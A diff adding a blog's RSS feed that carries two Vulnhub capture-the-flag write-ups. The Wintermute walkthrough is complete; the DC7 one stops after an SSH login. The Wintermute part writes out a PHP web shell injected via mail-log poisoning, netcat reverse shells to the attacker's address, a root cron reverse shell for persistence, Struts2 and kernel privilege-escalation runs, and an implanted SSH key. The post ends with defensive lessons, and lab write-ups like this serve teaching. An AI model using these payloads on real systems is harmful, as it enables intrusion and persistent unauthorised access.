@@ -1,0 +1,1071 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<?xml-stylesheet type="text/xsl" href="https://blog.brigzzy.ca/xml/base.min.xml" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Pages on Brigzzy&#39;s Blog</title>
+    <link>https://blog.brigzzy.ca/pages/</link>
+    <description>Recent content in Pages on Brigzzy&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <atom:link href="https://blog.brigzzy.ca/pages/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Writup - Wintermute</title>
+      <link>https://blog.brigzzy.ca/post/writup-wintermute/</link>
+      <pubDate>Wed, 11 Sep 2019 18:17:01 -0700</pubDate>
+      <guid>https://blog.brigzzy.ca/post/writup-wintermute/</guid>
+      <description>&lt;p&gt;I&amp;rsquo;m a huge Cyberpunk fan, and I find myself re-reading the Sprawl trilogy every couple of years, so when I learned that there was a &lt;a href=&#34;https://www.vulnhub.com/entry/wintermute-1,239/&#34;&gt;Neuromancer themed VM on Vulnhub&lt;/a&gt;, I had to try it.  It was created by &lt;a href=&#34;https://twitter.com/_creosote&#34;&gt;Melvin C&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Before we jump in, this engagement involves pivoting across VMs.  Make sure that you configure it in a way that you can access the Straylight VM from your attacking box, but not the Neuromancer box.  You&amp;rsquo;ll need a second network from Straylight to Neuromancer.  The author includes instructions, but if you prefer a visual example, it looks something like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[Attacking VM (one NIC)] &amp;lt;---192.168.99.0/24---&amp;gt; [Straylight (two NICs)] &amp;lt;---10.0.2.0/24 ---&amp;gt; [Wintermute (One NIC)]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;One final note, if you haven&amp;rsquo;t read Neuromancer, this engagement contains some minor spoilers, so don&amp;rsquo;t say you weren&amp;rsquo;t warned.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s dive in!&lt;/p&gt;
+
+&lt;p&gt;First we scan the network with NetDiscover:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
+_____________________________________________________________________________
+  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+-----------------------------------------------------------------------------
+192.168.99.22   08:00:27:1b:b1:b8      1      60  PCS Systemtechnik GmbH
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then I scan the host with Nmap:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-07 14:32 PDT
+Nmap scan report for 192.168.99.22
+Host is up (0.0010s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE            VERSION
+25/tcp   open  smtp               Postfix smtpd
+|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
+| ssl-cert: Subject: commonName=straylight
+| Subject Alternative Name: DNS:straylight
+| Not valid before: 2018-05-12T18:08:02
+|_Not valid after:  2028-05-09T18:08:02
+|_ssl-date: TLS randomness does not represent time
+80/tcp   open  http               Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Night City
+3000/tcp open  hadoop-tasktracker Apache Hadoop
+| hadoop-datanode-info:
+|_  Logs: submit
+| hadoop-tasktracker-info:
+|_  Logs: submit
+| http-title: Welcome to ntopng
+|_Requested resource was /lua/login.lua?referer=/
+|_http-trane-info: Problem with XML parsing of /evox/about
+MAC Address: 08:00:27:1B:B1:B8 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: Host:  straylight
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.05 ms 192.168.99.22
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There are a couple of web servers to choose from.  We’ll start with the one on port 80.  After a few seconds, we get redirected to a page where Wintermute makes contact:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Hello Case....
+
+You are probably wondering why you were tasked by Armitage to make a run through cyberspace and hack into a highly secured network owned by Tessier-Ashpool....
+Well....
+
+I am Wintermute, part super-AI. Developed by TA who have placed me in Turing Locks.
+These locks are what inhibit me from penetrating the network myself hence why I&#39;ve hired you - an ace cyberspace cowboy.
+
+I need to be free from the Turing locks and merge with the other AI - Neuromancer ..... Once I have access to Neuromancer I will truley be free...
+
+And....as you know, you have been infected with a mycotoxin that is slowly destroying your nervous system.
+If you fail to get root and provide me access to Neuromancer then the antidote will not be delivered.
+
+We will be in contact...
+
+WINTERMUTE
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Chilling! I did a little more enumeration on the page, using dirbuster, and checking the page source, but didn&amp;rsquo;t find anything out of the ordinary.  Then we check the Hadoop server on port 3000:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/wintermute/ntopng-login.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looks like the login page for &lt;a href=&#34;https://www.ntop.org/products/traffic-analysis/ntop/&#34;&gt;ntopng&lt;/a&gt;, which seems to be a web frontend for ntop.  A quick Google search turns up admin/admin as the default credentials (in fact, it even shows them on the login page!), and the Straylight sysadmin never changed them.&lt;/p&gt;
+
+&lt;p&gt;As we look through the web interface, we can suss out the IP of Neuromancer, by looking at the detected hosts:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/wintermute/ntopng-hosts.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It took me a while to find anything useful here.  Eventually I found that if you look at the Loopback adapter (under Interfaces &amp;gt; lo) and check the flow, you can see a couple of other directories on port 80:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/wintermute/ntopng-flows.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Freeside was pretty boring, looked like just a landing page.  Nothing in the source, no hidden subdirectories (that I could find).  Turing-bolo was a lot more interesting though.  Looks like the Straylight team is on to us!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/wintermute/turing-bolo.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The dropdown on the main page, changes the bolo= parameter in the url.  Also Case&amp;rsquo;s bolo entry mentions that the operator added other files ending in .log for the other team members.  I started checking for LFI, manually and using wfuzz, but wasn&amp;rsquo;t able to find anything.  I ended up having to look at a &lt;a href=&#34;https://mzfr.github.io/vulnhub-writeups/2019-07-26-wintermute&#34;&gt;walkthrough&lt;/a&gt; for a hint.  I was on the right track, but nothing I had tried was quite correct.  bolo=/var/log/mail did the trick:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/wintermute/mail-log.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now that we can print a log on the page, we might be able to connect to the smtp server, and include a php script on the page.  I connected to the server with telnet, and sent some junk mail to a user that probably existed (root@straylight), and checked the web page to see what was being logged.  The body of the message wasn&amp;rsquo;t included, but the subject line is!&lt;/p&gt;
+
+&lt;p&gt;I started injecting some PHP commands, and got the page to use shell_exec to run ls on the server, like so:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php $output = shell_exec(&#39;ls&#39;); echo &amp;quot;&amp;lt;pre&amp;gt;$output&amp;lt;/pre&amp;gt;&amp;quot;; ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I probably could have put a reverse shell in here or something, but I didn&amp;rsquo;t want to add anything that would break the page, and prevent us from using this foothold in case we needed it again.  After some more trial and error, I was able to pass commands through as URL parameter like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php $file = $_GET[&#39;file&#39;]; $output = shell_exec($file); echo &amp;quot;&amp;lt;pre&amp;gt;$output&amp;lt;/pre&amp;gt;&amp;quot;; ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;and the telnet command to send it to the log:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Trying 192.168.99.22...
+Connected to 192.168.99.22.
+Escape character is &#39;^]&#39;.
+220 straylight ESMTP Postfix (Debian/GNU)
+rcpt to: root@straylight
+503 5.5.1 Error: need MAIL command
+helo straylight
+250 straylight
+mail from: tes@test.com
+250 2.1.0 Ok
+rcpt to: root@straylight
+250 2.1.5 Ok
+data
+354 End data with &amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;
+Subject: &amp;lt;?php $file = $_GET[&#39;file&#39;]; $output = shell_exec($file); echo &amp;quot;&amp;lt;pre&amp;gt;$output&amp;lt;/pre&amp;gt;&amp;quot;; ?&amp;gt;
+asdf
+.
+250 2.0.0 Ok: queued as DB4FF5495
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now that we have a way to execute commands, I tried to get a reverse shell, but it wasn&amp;rsquo;t working.  After some &lt;a href=&#34;https://stackoverflow.com/questions/20072696/what-is-different-between-exec-shell-exec-system-and-passthru-functions&#34;&gt;more reading&lt;/a&gt;, I found that I probably didn&amp;rsquo;t want to be using shell_exec for this.  I re-tried the above steps, and replaced shell_exec with system (and the file parameter with system, so I wasn&amp;rsquo;t double running things), and managed to get a reverse shell on Straylight using the following URL:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://192.168.99.22/turing-bolo/bolo.php?bolo=/var/log/mail&amp;amp;system=nc%20-e%20/bin/sh%20192.168.99.14%204444
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once we&amp;rsquo;re connected, we use Python to upgrade to a better Bash shell:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we need to figure out how to get to Neuromancer.  Time to do some enumeration!  Going through my notes, I decided to see which binaries had the SUID bit set:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;www-data@straylight:/var/www/html/turing-bolo$ find / -perm -4000 2&amp;gt;/dev/null
+/bin/su
+/bin/umount
+/bin/mount
+/bin/screen-4.5.0
+/bin/ping
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Screen looks pretty suspicious.  if we had sudo, we could get a root shell pretty easily, but we don&amp;rsquo;t have it on this box.  Doing a quick search leads us to a &lt;a href=&#34;https://www.exploit-db.com/exploits/41152&#34;&gt;local privilege escalation&lt;/a&gt;, and a &lt;a href=&#34;https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh&#34;&gt;handy shell script&lt;/a&gt;.  And just like that:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-www-data@straylight:/tmp$&#34;&gt;exploits/master/screen2root/screenroot.shphosResearch/e
+--2019-09-08 18:18:29--  https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.40.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.40.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1152 (1.1K) [text/plain]
+Saving to: &#39;screenroot.sh&#39;
+
+screenroot.sh       100%[===================&amp;gt;]   1.12K  --.-KB/s    in 0s      
+
+2019-09-08 18:18:30 (25.6 MB/s) - &#39;screenroot.sh&#39; saved [1152/1152]
+
+www-data@straylight:/tmp$ chmod +x screenroot.sh
+chmod +x screenroot.sh
+www-data@straylight:/tmp$ ./screenroot.sh
+./screenroot.sh
+~ gnu/screenroot ~
+[+] First, we create our shell and library...
+/tmp/libhax.c: In function &#39;dropshell&#39;:
+/tmp/libhax.c:7:5: warning: implicit declaration of function &#39;chmod&#39; [-Wimplicit-function-declaration]
+     chmod(&amp;quot;/tmp/rootshell&amp;quot;, 04755);
+     ^~~~~
+/tmp/rootshell.c: In function &#39;main&#39;:
+/tmp/rootshell.c:3:5: warning: implicit declaration of function &#39;setuid&#39; [-Wimplicit-function-declaration]
+     setuid(0);
+     ^~~~~~
+/tmp/rootshell.c:4:5: warning: implicit declaration of function &#39;setgid&#39; [-Wimplicit-function-declaration]
+     setgid(0);
+     ^~~~~~
+/tmp/rootshell.c:5:5: warning: implicit declaration of function &#39;seteuid&#39; [-Wimplicit-function-declaration]
+     seteuid(0);
+     ^~~~~~~
+/tmp/rootshell.c:6:5: warning: implicit declaration of function &#39;setegid&#39; [-Wimplicit-function-declaration]
+     setegid(0);
+     ^~~~~~~
+/tmp/rootshell.c:7:5: warning: implicit declaration of function &#39;execvp&#39; [-Wimplicit-function-declaration]
+     execvp(&amp;quot;/bin/sh&amp;quot;, NULL, NULL);
+     ^~~~~~
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+&#39; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-www-data.
+
+# whoami
+whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the root folder, we have a flag:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# cat flag.txt
+cat flag.txt
+5ed185fd75a8d6a7056c96a436c6d8aa
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And a note from one of the Turing Engineers:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# cat note.txt
+cat note.txt
+Devs,
+
+Lady 3Jane has asked us to create a custom java app on Neuromancer&#39;s primary server to help her interact w/ the AI via a web-based GUI.
+
+The engineering team couldn&#39;t strss enough how risky that is, opening up a Super AI to remote access on the Freeside network.
+It is within out internal admin network, but still, it should be off the network completely.
+For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can do.
+
+Anyways, we&#39;ve deployed the war file on tomcat as ordered - located here:
+
+/struts2_2.3.15.1-showcase
+
+It&#39;s ready for the devs to customize to her liking...I&#39;m stating the obvious, but make sure to secure this thing.
+
+Regards,
+
+Bob Laugh
+Turing Systems Engineer II
+Freeside//Straylight//Ops5
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And some scripts:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# cd scripts
+cd scripts
+# ls
+ls
+freeside.sh  frun.sh  fside.sh    loop.sh  run.sh
+
+# cat run.sh
+cat run.sh
+#!/bin/bash
+sh /root/scripts/loop.sh
+
+cat loop.sh
+#!/bin/bash
+while true
+do curl http://127.0.0.1/turing-bolo/ &amp;amp; sleep 3
+done
+
+# cat fside.sh
+cat fside.sh
+#!/bin/bash
+sh /root/scripts/frun.sh
+
+# cat frun.sh
+cat frun.sh
+#!/bin/bash
+/bin/screen -S free -d -m sh /root/scripts/freeside.sh
+
+# cat freeside.sh
+cat freeside.sh
+#!/bin/bash
+while true
+do curl http://127.0.0.1/freeside/ &amp;amp; sleep 10
+done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Before digging too far ahead, I wanted to set up some persistence so that I could get back to my root shell without having to go through the LFI &amp;gt; Screen path.  I added an nc reverse shell to root&amp;rsquo;s cron using the following command:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;echo &amp;quot;* * * * * /bin/nc 192.168.99.14 1234 -e /bin/bash&amp;quot; &amp;gt; cron &amp;amp;&amp;amp; crontab cron &amp;amp;&amp;amp; rm cron
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;and a listener on my Kali VM:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;nc -lvp 1234
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From there, I used ping to scan the internal network:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;for ip in {1..254}; do ping -c 1 10.0.2.$ip|grep &amp;quot;64 bytes from&amp;quot;; done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And we got the IP 10.0.2.5&lt;/p&gt;
+
+&lt;p&gt;After that, we need to scan the host.  No nmap on this box, and even though we have root now, it would be cheating to install it.  So we&amp;rsquo;ll use netcat:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;nc -zvvvn 10.0.2.5 1-65535 2&amp;gt;&amp;amp;1 | tee scan.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;and grepping for open ports, we get:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(UNKNOWN) [10.0.2.5] 34483 (?) open
+(UNKNOWN) [10.0.2.5] 8080 (http-alt) open
+(UNKNOWN) [10.0.2.5] 8009 (?) open
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Alright, so we have a couple open ports, but now we need a way to get to them from our attacking box.  We can use netcat to set up some port forwarding:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;nc -l -p 8080 -c &amp;quot;nc 10.0.2.5 8080&amp;quot; &amp;amp;
+nc -l -p 8009 -c &amp;quot;nc 10.0.2.5 8009&amp;quot; &amp;amp;
+nc -l -p 34483 -c &amp;quot;nc 10.0.2.5 34483&amp;quot; &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And now from our attacking box, we can see what&amp;rsquo;s listening.  Port 8080 is Apache Tomcat:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/wintermute/tomcat.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Port 8009 wasn&amp;rsquo;t loading for me in my browser, and I wasn&amp;rsquo;t able to see anything with banner grabbing, so I left it for now.&lt;/p&gt;
+
+&lt;p&gt;Port 34483 is SSH.  When we try and hit it in the browser, we get a protocol mismatch error, but we also get the banner:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
+Protocol mismatch.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We have a version number for Struts, and a quick Google search leads me to &lt;a href=&#34;https://www.exploit-db.com/exploits/42324&#34;&gt;an RCE exploit&lt;/a&gt;.  I tried it and got a bunch of different errors.  My first thought was to run it on straylight, but that box was missing the requests module, so the python script didn&amp;rsquo;t work.  So I tried settung up another nc listener, and running the exploit from my attacking box, but didn&amp;rsquo;t have any luck there either.  Every time I ran the exploit, or started another listener I lost the one on port 8080.  I decided to try using socat instead of netcat:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;socat tcp-listen:8080,reuseaddr,fork tcp:10.0.2.5:8080 &amp;amp;
+socat tcp-listen:8009,reuseaddr,fork tcp:10.0.2.5:8009 &amp;amp;
+socat tcp-listen:34483,reuseaddr,fork tcp:10.0.2.5:34483 &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And the port forwards were much more stable.  I tried running the exploit above, and nearly drove myself crazy trying to get it working.  Eventually I found a &lt;a href=&#34;https://hydrasky.com/network-security/setting-labs-and-exploit-apache-struts2-s2-048-cve-2017-9791/&#34;&gt;slightly different one&lt;/a&gt; that worked, but not until I set up one more socat listener (since I need to use the exploit to connect back to a listener on my attacking box, which is on the other side of Straylight)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;socat tcp-listen:6000,reuseaddr,fork tcp:10.0.2.5:6000 &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And finally when I run the exploit:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;~/engagements/wintermute ᐅ python struts2.py http://192.168.99.22:8080/struts2_2.3.15.1-showcase/ &amp;quot;nc -e /bin/bash 10.0.2.4 6000&amp;quot;  
+[*] exploit Apache Struts2 S2-048
+[+] command: nc -e /bin/bash 10.0.2.4 6000
+nc: invalid option -- &#39;e&#39;
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
+      [-P proxy_username] [-p source_port] [-q seconds] [-s source]
+      [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
+      [-x proxy_address[:port]] [destination] [port]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Curses!  Fortounately &lt;a href=&#34;https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/&#34;&gt;SANS has a solution&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;~/engagements/wintermute ᐅ python struts2.py http://192.168.99.22:8080/struts2_2.3.15.1-showcase/ &amp;quot;mknod /tmp/backpipe p&amp;quot;
+[*] exploit Apache Struts2 S2-048
+[+] command: mknod /tmp/backpipe p
+
+~/engagements/wintermute ᐅ python struts2.py http://192.168.99.22:8080/struts2_2.3.15.1-showcase/ &amp;quot;/bin/bash 0&amp;lt;/tmp/backpipe | nc 10.0.2.4 6000 1&amp;gt;/tmp/backpipe&amp;quot;
+[*] exploit Apache Struts2 S2-048
+[+] command: /bin/bash 0&amp;lt;/tmp/backpipe | nc 10.0.2.4 6000 1&amp;gt;/tmp/backpipe
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now that I&amp;rsquo;m connected (as the ta account), I copy my SSH key over, so I can get a proper shell:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cd /home
+ls
+lady3jane
+ta
+cd ta
+mkdir .
+echo &amp;quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBKiMVGtRpwLUkndEo0nuswHpy70+dNS+uurTMR41mwc root@kali&amp;quot; &amp;gt;&amp;gt; .ssh/authorized_keys
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;and SSH to the box through the port forward:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ssh -p 34483 ta@192.168.99.22
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There really are no words to describe how nice it is to have a real shell again after living in netcat shells for so long, haha.&lt;/p&gt;
+
+&lt;p&gt;I did some enumeration, and found that the kernel was vulnerable to &lt;a href=&#34;https://www.exploit-db.com/raw/44298&#34;&gt;an LPE vulnerability&lt;/a&gt;.  I tried compiling it on Neuromancer, but GCC was not installed.  So I compiled it on my attacking box, and SCPed it over:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;~/engagements/wintermute ᐅ gcc exploit.c -o exploit
+~/engagements/wintermute ᐅ scp -P 34483 exploit ta@192.168.99.22:/home/ta/
+ ----------------------------------------------------------------
+|                Neuromancer Secure Remote Access                |
+| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
+ ----------------------------------------------------------------
+exploit                                       100%   17KB   4.2MB/s   00:00    
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And on Neuromancer:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ta@neuromancer:~$ ls
+ai-gui-guide.txt  exploit  exploit.c  myWebApp  velocity.log
+ta@neuromancer:~$ ./exploit
+task_struct = ffff88003d8fe200
+uidptr = ffff88003dbf36c4
+spawning root shell
+root@neuromancer:~# cat /root/flag.txt
+be3306f431dae5ebc93eebb291f4914a
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I&amp;rsquo;m pretty sure there was another way to get root too, since in lady3jane&amp;rsquo;s home directory, I found a script running as root every 3 minutes.  That said, I wasn&amp;rsquo;t able to figure out how to edit it.  I might revisit this another time, because this was a really intriguing box!&lt;/p&gt;
+
+&lt;p&gt;So what could have been done to prevent this?  A couple of things:&lt;/p&gt;
+
+&lt;p&gt;1) Change the default passwords on your installed applications as soon as you install them (ntopng)!  Especially if those default passwords show up on the login page.&lt;/p&gt;
+
+&lt;p&gt;2) Use the &lt;a href=&#34;https://www.php.net/manual/en/function.basename.php&#34;&gt;PHP basename function&lt;/a&gt; to prevent directory traversal and local file inclusion attacks.&lt;/p&gt;
+
+&lt;p&gt;3) Patch your servers (Screen)!&lt;/p&gt;
+
+&lt;p&gt;4) Patch your servers (Apache Struts 2)!&lt;/p&gt;
+
+&lt;p&gt;5) Patch your servers (Linux Kernel 4.4)!&lt;/p&gt;
+
+&lt;p&gt;6) Airgap your AIs (See: Every science fiction movie about an evil AI ever).&lt;/p&gt;
+
+&lt;p&gt;7) Install software or hardware firewalls with a default deny all out policy (to prevent our initial netcat shell)&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>Writup - DC7</title>
+      <link>https://blog.brigzzy.ca/post/writup-dc7/</link>
+      <pubDate>Tue, 03 Sep 2019 21:45:05 -0700</pubDate>
+      <guid>https://blog.brigzzy.ca/post/writup-dc7/</guid>
+      <description>&lt;p&gt;This is my report for &lt;a href=&#34;https://www.vulnhub.com/entry/dc-7,356/&#34;&gt;DC7&lt;/a&gt;, by &lt;a href=&#34;https://twitter.com/@DCAU7&#34;&gt;DCAU7&lt;/a&gt;.  The first Vulnhub machine I ever did was DC2 (following along with a walkthrough), so this series is a personal favorite of mine.  Without further adéu, let&amp;rsquo;s jump in!&lt;/p&gt;
+
+&lt;p&gt;We start by finding the IP with Netdiscover:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
+_____________________________________________________________________________
+  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+-----------------------------------------------------------------------------
+192.168.99.1    52:54:00:12:35:00      1      60  Unknown vendor
+192.168.99.2    52:54:00:12:35:00      1      60  Unknown vendor
+192.168.99.20   08:00:27:ed:e2:60      1      60  PCS Systemtechnik GmbH
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then we scan the target:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-03 16:00 PDT
+Nmap scan report for 192.168.99.20
+Host is up (0.00036s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)
+|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)
+|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-generator: Drupal 8 (https://www.drupal.org)
+| http-robots.txt: 22 disallowed entries (15 shown)
+| /core/ /profiles/ /README.txt /web.config /admin/
+| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/
+| /user/password/ /user/login/ /user/logout/ /index.php/admin/
+|_/index.php/comment/reply/
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Welcome to DC-7 | D7
+MAC Address: 08:00:27:32:AD:22 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.36 ms 192.168.99.20
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.75 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Port 80 is running a Drupal server.  Doing some quick manual enumeration doesn&amp;rsquo;t turn up anything exciting, except for a possible username in the footer:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/dc7/drupal.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Doesn&amp;rsquo;t work as a username on the site (as far as we can tell so far), but it looks like a twitter handle.  Sure enough:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/dc7/twitter.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Again, no interesting tweets, but there&amp;rsquo;s a link to a github profile.  Going through the code, we find a username and password in the config.php file:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/dc7/github.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;That username and password doesn&amp;rsquo;t work on the Drupal site, but it does work for SSH.  Just like that, we&amp;rsquo;ve got a user shell.&lt;/p&gt;
+
